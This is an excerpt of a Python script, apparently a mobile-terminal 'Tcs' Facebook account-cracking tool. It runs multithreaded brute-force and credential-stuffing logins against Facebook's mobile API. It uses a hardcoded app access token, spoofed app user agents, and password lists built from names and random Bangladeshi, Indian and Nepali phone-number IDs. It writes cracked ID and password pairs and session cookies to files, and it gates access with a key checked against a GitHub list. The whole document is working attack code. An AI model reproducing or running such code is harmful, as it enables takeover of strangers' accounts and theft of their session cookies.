...
#-----------------------[ LOGO-CODE ]-----------------------#
logo = f"""
                 _____  _____ ______  __   __       _ ______  _____ __  __ _____ _   _ 
...
#-----------------------[ FILE-CODE ]-----------------------#
def file():
    fresh();print(" \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFOR EXAMPLE: \x1b[38;5;46m/sdcard/TCS.txt");line()
    ...
    Tcs_x=input("\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46mCHOOSE : ")
    plist=[]
    fresh()
    try:
    ...
    with tred(max_workers=30) as Tcs:
        fresh()
        tl = str(len(fo))
        print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mTOTAL IDS \x1b[1;97m● {tl}')
        print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mMETHOD \x1b[1;97m● \x1b[1;97mM{Tcs_x}\x1b[38;5;46m')
        ...
        for user in fo:
            ...
            passlist = plist
            if Tcs_x =='1':
                Tcs.submit(api1,ids,names,passlist)
            if Tcs_x =='2':
                Tcs.submit(api2,ids,names,passlist)
            if Tcs_x =='3':
                Tcs.submit(api3,ids,names,passlist)
#-----------------------[ FILE-METHOD-CODE ]-----------------------#
def api1(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r\x1b[38;5;196m [\x1b[38;5;46mTcs\x1b[1;97m-\x1b[38;5;46mM1\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46m%s\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK:%s\x1b[38;5;196m]'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/422.0.0.44.35;FBBV/479033820;FBRV/0;FBPN/com.facebook.katana;FBLC/ms_MY;FBMF/Huawei;FBBD/Huawei;FBDV/258 Pro;FBSV/4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
            ...
            if 'session_key' in po:
                    ...
                    print('\r\r\x1b[38;5;196m[\x1b[38;5;46mTcs\x1b[1;97m-\x1b[38;5;46m💚\x1b[38;5;196m]\x1b[38;5;46m '+uid+'|'+pas)
                    #line()
                    file_path = os.path.join(folder_path, 'Tcs-FILE-OK.txt')
                    open('/sdcard/Tcs/Tcs-FILE-OK-COOKIE-M1.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                    ...
                    open('/sdcard/Tcs-CP.txt','a').write(uid+'|'+pas+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    cps.append(uid)
                    break
...
def api2(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r\x1b[38;5;196m [\x1b[38;5;46mTcs\x1b[1;97m-\x1b[38;5;46mM2\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46m%s\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK:%s\x1b[38;5;196m]'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print('\r\r\x1b[38;5;196m[\x1b[38;5;46mTCS\x1b[1;97m-\x1b[38;5;46mOK\x1b[38;5;196m]\x1b[38;5;46m '+uid+'|'+pas)
                    #line()
                    file_path = os.path.join(folder_path, 'Tcs-FILE-OK.txt')
                    open('/sdcard/Tcs/Tcs-FILE-OK-COOKIE-M2.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r\r\33[1m\33[1;35m [TCS-CP] '+uid+' | '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'BOT-FILE-CP.txt')
                    open('/sdcard/Tcs-CP.txt','a').write(uid+'|'+pas+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
...
def api3(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r\x1b[38;5;196m [\x1b[38;5;46mTcs\x1b[1;97m-M3\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46m%s\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK:%s\x1b[38;5;196m]'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            fbbv = str(random.randint(000000000,999999999))
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            uaddx = f'[lFBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/26.0.0.7632;FBBV/5040004;FBDM/{density= ,width=720,height=1280};FBLC/en_US;FBRV/2910990;FBCR/null;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.adsmanager;FBDV/y21;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            head = {'User-Agent':uaddx,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            ...
            if 'session_key' in po:
                    ...
                    #line()
                    file_path = os.path.join(folder_path, 'Tcs-FILE-OK.txt')
                    open('/sdcard/Tcs/Tcs-FILE-OK-COOKIE-M3.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    oks.append(uid)
                    break
...
def rndm_bd():
        ...
        with tred(max_workers=30) as Tanim:
                ...
                for love in user:
                        ids = code + love 
                        pasx = [love,ids,ids[:8],ids[:7],'@@@###','aabbcc','22334455','১২৩৪৫৬','১২৩৪৫৬৭৮','102030','405060','708090']
...
def rndm_ind():
        ...
        with tred(max_workers=30) as Tanim:
                ...
                for love in user:
                        ids = code + love 
                        pasx = ['57575751','57575752','07860786','57273200','59039200',ids,love,ids[3:]]
                        Tanim.submit(rndmx,ids,pasx,tl)
#-----------------------[ RNDM-CODE-NEPAL ]-----------------------#
def rndm_nep():
...
def rndmx(ids,pasx,tl):
        global loop,ok
        sys.stdout.write(f'\r{w} \x1b[38;5;196m[\x1b[38;5;46mTcs\x1b[1;97m-\x1b[38;5;146mXD\x1b[38;5;196m] [{loop}] [{len(ok)}|{len(cp)}]');sys.stdout.flush()
        try:
                for pas in pasx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/393.0.0.33.46;FBBV/970383993;FBRV/0;FBPN/com.facebook.katana;FBLC/el_GR;FBMF/Nokia;FBBD/Nokia;FBDV/N833T;FBSV/8;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
                        ...
                        if 'session_key' in po:
                                ...
                                try:
                                    ...
                                    if 'Photoshop' in res:
                                        print(f'\r{g} \x1b[38;5;196m[\x1b[38;5;46mTCS\x1b[1;97m-\x1b[38;5;46mOK\x1b[38;5;196m]\x1b[38;5;46m {str(uid)} \x1b[1;97m● \x1b[38;5;46m{pas} ')
                                        coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                        if 'y' in cokix:print(f'\r{g} (Kid) : {coki} ')
                                        open('/sdcard/TCS-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                        ok.append(str(uid))
                                        break
                                    else:break
                                except:break
                                ...
                                open('/sdcard/Tcs-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
...
def aproval():
    ...
    id = "".join(uuid)
    try:
        url_apv = requests.get('https://github.com/arif-143/JESMIN/blob/main/approbal.txt').text
        if id in url_apv:
            print(f"\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mAPPROVED SUCCESSFUL");time.sleep(3)
            Main()
            pass
        else:
            print(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mYOUER KEY : Tcs{id}Cyber')
            line()
